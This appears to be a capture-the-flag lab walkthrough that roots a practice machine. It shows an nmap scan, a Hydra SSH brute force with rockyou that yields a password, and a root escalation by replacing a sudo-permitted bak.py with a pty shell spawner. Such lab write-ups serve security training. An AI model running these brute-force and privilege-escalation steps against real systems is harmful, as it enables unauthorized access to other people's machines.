
---

# 🛠️ Step-by-Step Walkthrough

## 1. Nmap Scan Results 🔍
Run the following command to initiate an Nmap scan:

```bash
nmap -sC -sV -Pv -vv [IP]
```

![Nmap Scan Result](https://prod-files-secure.s3.us-west-2.amazonaws.com/233b5bad-d5f7-427b-9519-a185de520345/fd70a3be-c66f-49c3-978c-b2fb332b9f3b/image.png)

---

## 2. Web Enumeration 🌐
We found some interesting results during directory busting.

### Directory Findings:
- **robots.txt** contains:
  
    ```text
    User-agent: rockyou 
    Disallow: /
    ```

- The webpage also lists three users, with one being particularly noteworthy: **melodious**.

---

## 🔑 Initial Access
We attempt to brute-force SSH access for the user **melodious** using Hydra:

```bash
hydra -L users.txt -P rockyou.txt [IP] ssh -t 5
```

🎉 **Success!** We retrieved valid SSH credentials:

```bash
meliodas:iloveyou1
```

---

## 🚀 Privilege Escalation
After logging in via SSH, we investigate further for privilege escalation possibilities:

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

We found that **melodious** can execute `bak.py` as root. However, the file is protected and cannot be edited.

### 📝 Solution:
We delete the original file and create our own malicious version:

```bash
meliodas@ubuntu:~$ rm bak.py
meliodas@ubuntu:~$ echo "import pty; pty.spawn('/bin/bash')" > /home/meliodas/bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
```

---

## 🎉 Root Access Achieved!
We now have root access:

```bash
root@ubuntu:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

**Mission Accomplished!** 🚀 Another machine successfully rooted!

---

This more formatted version adds visual appeal and structure, making it easy to read and follow!
